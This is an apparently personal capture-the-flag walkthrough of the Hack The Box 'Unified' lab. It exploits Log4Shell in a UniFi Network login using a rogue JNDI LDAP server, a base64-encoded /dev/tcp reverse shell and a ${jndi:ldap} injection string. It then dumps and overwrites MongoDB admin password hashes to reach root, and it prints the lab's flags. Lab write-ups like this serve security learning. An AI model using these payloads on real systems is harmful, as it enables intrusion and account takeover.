#veryeasy #linux #vulnerabilityAssessment #customApplications #mongodb  #clearTextCredentials #defaultCredentials #codeInjection

## 0. **Lab infos**

**Difficulty :** Very easy
**Name :** Unified
**IP** : 10.129.63.103 || 10.129.149.4
**Objectives :** Get user and root flags
**OS :** Linux

##### **Conclusion**
**Time :** 2h18min
	**Start :** 19.01.2025 / 20:49
	**Break at/to :** 19.01.2025 / 21:24 || 13.01.2025 / 20:04
	**Finish :** 23.01.2025 / 21:47
**Satisfaction :**  3/10 For the exploit and the mongodb and other thing I utilize medium

## 1. **Reconnaissance

#Nmap scan :

```bash
nmap -sV 10.129.63.103
```

Output :

```BASH
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
8443/tcp open  ssl/nagios-nsca Nagios NSCA
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service
```

We can see that we are on an ubuntu server with a port 6789 that is probably an ibm-db a web site on the port 8080 and another thing on 8443 port.

On firefox the connection to the port 8080 failed so we try `6789` and `8443` :

	- 6789 Failed
	- 8443 Failed

BUT if we make an https request instead of http with the `8443` port we have a login page :

![[Pasted image 20250119210043.png]]

With #nmap :

```BASH
nmap -sV -sC 10.129.63.103 -p 8443
```

Output :

```BASH
PORT     STATE SERVICE         VERSION
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
```

We have the sofware title that is running on port 8443 : `UniFi Network`

In the `Accessibility` section of the inspector we can see the version of the software :

![[Pasted image 20250119210902.png]]

The version is : `6.4.54`

Let's go find if there's some vulnerability. 
With google we can see there is the `CVE-2021-44228` vuln accessible for us.

With another #nmap scan we have this :

```BASH
nmap -sV 10.129.63.103 -p-
```

Output :

```BASH 
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
8443/tcp open  ssl/nagios-nsca Nagios NSCA
8843/tcp open  ssl/unknown
8880/tcp open  cddbp-alt?
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service
```

## 2. **Weaponization**

First we download the CVE :
```BASH
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
```

We listen on the `4444` port

```BASH
nc -lvp 4444
```

And we can start the exploit 

## 3. **Delivery**

We go to encode in Base64 the code that we want to inject in :

```BASH
echo 'bash -c bash -i >&/dev/tcp/10.10.15.168/4444 0>&1' | base64
```

And copy the output :

```BASE64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTY4LzQ0NDQgMD4mMQo=
```


Go create an #LDAP server on our machine :

```BASH
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTY4LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.168"
```

And note one of the #LDAP link.
## 4. **Exploitation**

Open #burpsuite and the browser.
Go to the login page and try to log :

![[Pasted image 20250123204510.png]]

![[Pasted image 20250123204537.png]]

In "remeber" past one of the #LDAP link with a `$` like this :
```LINK
"${ldap://10.10.15.168:1389/o=websphere2}"
```

![[Pasted image 20250123205715.png]]

And forward the request.
But nothing work and we have an error.

So we change the link to :

```BASH
"${jndi:ldap://10.10.15.168:1389/o=tomcat}"
```

And it's work we have our shell.

For us we prefer to have a stable shell so we wrote this :

```BASH
script /dev/null -c bash
```


## 5. **Installation**

## 6. **Command & Control**

## 7. **Actions on Objectives**

Get the reflex to check all the services there are running on the target victim with :

```BASH
ps -aux
```

We discovered that there is a mongodb running on the port 27117 so let's go open it.

```BASH
mongo --port 27117
show dbs
```

Output :

```BASH
shshow dbs
ace       0.002GB
ace_stat  0.000GB
admin     0.000GB
config    0.000GB
local     0.000GB
```

Well, we want to escalate our privilege. The password of user root is probably in the ace bdd of mongo because it's the default bdd of mongo.

```SHELL
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

Output :
```BASH
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
	"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
	"name" : "administrator",
	"email" : "administrator@unified.htb",
	"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
	"time_created" : NumberLong(1640900495),
	"last_site_name" : "default",
	"ui_settings" : {
		"neverCheckForUpdate" : true,
		"statisticsPrefferedTZ" : "SITE",
		"statisticsPreferBps" : "",
		"tables" : {
			"device" : {
				"sortBy" : "type",
				"isAscending" : true,
				"initialColumns" : [
					"type",
					"deviceName",
					"status",
					"connection",
					"network",
					"ipAddress",
					"experience",
					"firmwareStatus",
					"downlink",
					"uplink",
					"dailyUsage"
				],
				"columns" : [
					"type",
					"deviceName",
					"status",
					"macAddress",
					"model",
					"ipAddress",
					"connection",
					"network",
					"experience",
					"firmwareStatus",
					"firmwareVersion",
					"memoryUsage",
					"cpuUsage",
					"loadAverage",
					"utilization",
					"clients",
					"lastSeen",
					"downlink",
					"uplink",
					"dailyUsage",
					"uptime",
					"wlan2g",
					"wlan5g",
					"radio2g",
					"radio5g",
					"clients2g",
					"clients5g",
					"bssid",
					"tx",
					"rx",
					"tx2g",
					"tx5g",
					"channel",
					"channel2g",
					"channel5g"
				]
			},
			"client" : {
				"sortBy" : "physicalName",
				"isAscending" : true,
				"initialColumns" : [
					"status",
					"clientName",
					"physicalName",
					"connection",
					"ip",
					"experience",
					"Downlink",
					"Uplink",
					"dailyUsage"
				],
				"columns" : [
					"status",
					"clientName",
					"mac",
					"physicalName",
					"connection",
					"network",
					"interface",
					"wifi_band",
					"ip",
					"experience",
					"Downlink",
					"Uplink",
					"dailyUsage",
					"uptime",
					"channel",
					"Uplink_apPort",
					"signal",
					"txRate",
					"rxRate",
					"first_seen",
					"last_seen",
					"rx_packets",
					"tx_packets"
				],
				"filters" : {
					"status" : {
						"active" : true
					},
					"connection_type" : {
						"ng" : true,
						"na" : true,
						"wired" : true,
						"vpn" : true
					},
					"clients_type" : {
						"users" : true,
						"guests" : true
					},
					"device" : {
						"device" : ""
					}
				}
			},
			"unifiDevice" : {
				"sortBy" : "type",
				"isAscending" : true,
				"columns" : [
					"type",
					"name",
					"status",
					"macAddress",
					"model",
					"ipAddress",
					"connection",
					"network",
					"experience",
					"firmwareStatus",
					"firmwareVersion",
					"memoryUsage",
					"cpuUsage",
					"loadAverage",
					"utilization",
					"clients",
					"dailyUsage",
					"lastSeen",
					"downlink",
					"uplink",
					"uptime",
					"wlan2g",
					"wlan5g",
					"radio2g",
					"radio5g",
					"clients2g",
					"clients5g",
					"bssid",
					"tx",
					"rx",
					"tx2g",
					"tx5g",
					"channel",
					"channel2g",
					"channel5g"
				],
				"initialColumns" : [
					"type",
					"name",
					"status",
					"connection",
					"network",
					"ipAddress",
					"experience",
					"firmwareStatus",
					"downlink",
					"uplink",
					"dailyUsage"
				]
			},
			"unifiDeviceNetwork" : {
				"sortBy" : "type",
				"isAscending" : true,
				"columns" : [
					"type",
					"name",
					"status",
					"macAddress",
					"model",
					"ipAddress",
					"connection",
					"network",
					"experience",
					"firmwareStatus",
					"firmwareVersion",
					"memoryUsage",
					"cpuUsage",
					"loadAverage",
					"utilization",
					"clients",
					"dailyUsage",
					"lastSeen",
					"downlink",
					"uplink",
					"uptime",
					"wlan2g",
					"wlan5g",
					"radio2g",
					"radio5g",
					"clients2g",
					"clients5g",
					"bssid",
					"tx",
					"rx",
					"tx2g",
					"tx5g",
					"channel",
					"channel2g",
					"channel5g"
				],
				"initialColumns" : [
					"type",
					"name",
					"status",
					"connection",
					"network",
					"ipAddress",
					"experience",
					"firmwareStatus",
					"downlink",
					"uplink",
					"dailyUsage"
				]
			},
			"unifiDeviceAccess" : {
				"sortBy" : "type",
				"isAscending" : true,
				"columns" : [
					"type",
					"name",
					"status",
					"macAddress",
					"model",
					"ipAddress",
					"connection",
					"network",
					"experience",
					"firmwareStatus",
					"firmwareVersion",
					"memoryUsage",
					"cpuUsage",
					"loadAverage",
					"utilization",
					"clients",
					"dailyUsage",
					"lastSeen",
					"downlink",
					"uplink",
					"uptime",
					"wlan2g",
					"wlan5g",
					"radio2g",
					"radio5g",
					"clients2g",
					"clients5g",
					"bssid",
					"tx",
					"rx",
					"tx2g",
					"tx5g",
					"channel",
					"channel2g",
					"channel5g"
				],
				"initialColumns" : [
					"type",
					"name",
					"status",
					"connection",
					"network",
					"ipAddress",
					"experience",
					"firmwareStatus",
					"downlink",
					"uplink",
					"dailyUsage"
				]
			},
			"unifiDeviceProtect" : {
				"sortBy" : "type",
				"isAscending" : true,
				"columns" : [
					"type",
					"name",
					"status",
					"macAddress",
					"model",
					"ipAddress",
					"connection",
					"network",
					"experience",
					"firmwareStatus",
					"firmwareVersion",
					"memoryUsage",
					"cpuUsage",
					"loadAverage",
					"utilization",
					"clients",
					"dailyUsage",
					"lastSeen",
					"downlink",
					"uplink",
					"uptime",
					"wlan2g",
					"wlan5g",
					"radio2g",
					"radio5g",
					"clients2g",
					"clients5g",
					"bssid",
					"tx",
					"rx",
					"tx2g",
					"tx5g",
					"channel",
					"channel2g",
					"channel5g"
				],
				"initialColumns" : [
					"type",
					"name",
					"status",
					"connection",
					"network",
					"ipAddress",
					"experience",
					"firmwareStatus",
					"downlink",
					"uplink",
					"dailyUsage"
				]
			},
			"unifiDeviceTalk" : {
				"sortBy" : "type",
				"isAscending" : true,
				"columns" : [
					"type",
					"name",
					"status",
					"macAddress",
					"model",
					"ipAddress",
					"connection",
					"network",
					"experience",
					"firmwareStatus",
					"firmwareVersion",
					"memoryUsage",
					"cpuUsage",
					"loadAverage",
					"utilization",
					"clients",
					"dailyUsage",
					"lastSeen",
					"downlink",
					"uplink",
					"uptime",
					"wlan2g",
					"wlan5g",
					"radio2g",
					"radio5g",
					"clients2g",
					"clients5g",
					"bssid",
					"tx",
					"rx",
					"tx2g",
					"tx5g",
					"channel",
					"channel2g",
					"channel5g"
				],
				"initialColumns" : [
					"type",
					"name",
					"status",
					"connection",
					"network",
					"ipAddress",
					"experience",
					"firmwareStatus",
					"downlink",
					"uplink",
					"dailyUsage"
				]
			},
			"insights/wifiScanner" : {
				"sortBy" : "apCount",
				"isAscending" : false,
				"initialColumns" : [
					"apCount",
					"essid",
					"bssid",
					"security",
					"radio",
					"signal",
					"channel",
					"band",
					"bw",
					"oui",
					"date",
					"ap_mac"
				],
				"columns" : [
					"apCount",
					"essid",
					"bssid",
					"security",
					"radio",
					"signal",
					"channel",
					"band",
					"bw",
					"oui",
					"date",
					"ap_mac"
				]
			},
			"insights/wifiMan" : {
				"sortBy" : "date",
				"isAscending" : false,
				"initialColumns" : [
					"clinet_name",
					"client_wifi_experience",
					"device_model",
					"device_name",
					"wlan_essid",
					"client_signal",
					"wlan_channel_width",
					"down",
					"up",
					"endPoint",
					"rate",
					"date"
				],
				"columns" : [
					"clinet_name",
					"client_wifi_experience",
					"device_model",
					"device_name",
					"wlan_essid",
					"client_signal",
					"wlan_channel_width",
					"down",
					"up",
					"endPoint",
					"rate",
					"date"
				]
			}
		},
		"topologyViewSettings" : {
			"showAllDevices" : true,
			"showAllClients" : true,
			"show2GClients" : true,
			"show5GClients" : true,
			"showWiredClients" : true,
			"showSSID" : false,
			"showWifiExperience" : true,
			"showRadioChannel" : false,
			"showWifiStandards" : false,
			"showWiredSpeed" : false,
			"showWiredPorts" : false,
			"online" : true,
			"offline" : true,
			"isolated" : true,
			"pending_adoption" : true,
			"managed_by_another_console" : true
		},
		"preferences" : {
			"alertsPosition" : "top_right",
			"allowHiddenDashboardModules" : false,
			"browserLogLevel" : "INFO",
			"bypassAutoFindDevices" : false,
			"bypassConfirmAdoptAndUpgrade" : false,
			"bypassConfirmBlock" : false,
			"bypassConfirmRestart" : false,
			"bypassConfirmUpgrade" : false,
			"bypassHybridDashboardNotice" : false,
			"bypassDashboardUdmProAd" : false,
			"bypassHybridSettingsNotice" : false,
			"dateFormat" : "MMM DD YYYY",
			"dismissWlanOverrides" : false,
			"enableNewUI" : false,
			"hideV3SettingsIntro" : true,
			"isAppDark" : true,
			"isPropertyPanelFixed" : true,
			"isRegularGraphForAirViewEnabled" : false,
			"isResponsive" : false,
			"isSettingsDark" : true,
			"isUndockedByDefault" : false,
			"noWhatsNew" : false,
			"propertyPanelCollapse" : false,
			"propertyPanelMultiMode" : true,
			"refreshButtonEnabled" : false,
			"refreshRate" : "2MIN",
			"refreshRateRememberAll" : false,
			"rowsPerPage" : 50,
			"showAllPanelActions" : false,
			"showWifimanAppsBanner" : true,
			"timeFormat" : "H:mm",
			"use24HourTime" : true,
			"useBrowserTheme" : false,
			"useSettingsPanelView" : false,
			"websocketEnabled" : true,
			"withStickyTableActions" : true,
			"isUlteModalClosed" : false,
			"isUbbAlignmentToolModalClosed" : false,
			"offlineClientTimeframe" : 24
		},
		"preferredLanguage" : "en",
		"dashboardConfig" : {
			"lastActiveDashboardId" : "61ce269d46e0fb0012d47ec6"
		}
	},
	"requires_new_password" : false,
	"email_alert_enabled" : true,
	"email_alert_grouping_enabled" : true,
	"html_email_enabled" : true,
	"is_professional_installer" : false,
	"push_alert_enabled" : true
}
{
	"_id" : ObjectId("61ce4a63fbce5e00116f424f"),
	"email" : "michael@unified.htb",
	"name" : "michael",
	"x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0",
	"requires_new_password" : false,
	"time_created" : NumberLong(1640909411),
	"last_site_name" : "default",
	"email_alert_enabled" : false,
	"email_alert_grouping_enabled" : false,
	"email_alert_grouping_delay" : 60,
	"push_alert_enabled" : false
}
{
	"_id" : ObjectId("61ce4ce8fbce5e00116f4251"),
	"email" : "seamus@unified.htb",
	"name" : "Seamus",
	"x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.",
	"requires_new_password" : true,
	"time_created" : NumberLong(1640910056),
	"last_site_name" : "default"
}
{
	"_id" : ObjectId("61ce4d27fbce5e00116f4252"),
	"email" : "warren@unified.htb",
	"name" : "warren",
	"x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.",
	"requires_new_password" : true,
	"time_created" : NumberLong(1640910119),
	"last_site_name" : "default"
}
{
	"_id" : ObjectId("61ce4d51fbce5e00116f4253"),
	"email" : "james@unfiied.htb",
	"name" : "james",
	"x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1",
	"requires_new_password" : false,
	"time_created" : NumberLong(1640910161),
	"last_site_name" : "default"
}
```

At the first line we have an `administrator` user with a hash : `$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.` but it's impossible to crack this hash...

So we try to update his password. First we create a new hash in our attacker machine:

```BASH
mkpasswd -m sha-512 Password
```

The future password is `Password`

```HASH

$6$T3j3cpRnUtaEAXCz$dio0Y1WN9.3KkLloPKSr4NdJIQ5SfeFqGUXXlVxIQ/3IG1183ucRR/Y1tgdXzDMA7387.WOGbKt2LZzao.6j2.

```

And we try to update the password with :

```BASH
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")}, {$set: {"x_shadow": "$6$T3j3cpRnUtaEAXCz$dio0Y1WN9.3KkLloPKSr4NdJIQ5SfeFqGUXXlVxIQ/3IG1183ucRR/Y1tgdXzDMA7387.WOGbKt2LZzao.6j2."}})'
```

And we check if the update was done :

```SHELL
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

And it's work. So go login in the web page with `administrator:Password`

It's all working.

In the settings we cane change the ssh auth :

![[Pasted image 20250123214218.png]]

We chose `1234` for the password.
And apply changes.

So we log in ssh

```BASH
ssh root@10.129.149.4
```

It's take time for have the changes apply.

But we are now root.

Root flag :

```FLAG
e50bc93c75b634e4b272d2f771c33681
```

In the folder of michael we have the user.txt flag :

```FLAG
6ced1a6a89e666c0620cdb10262ba127
```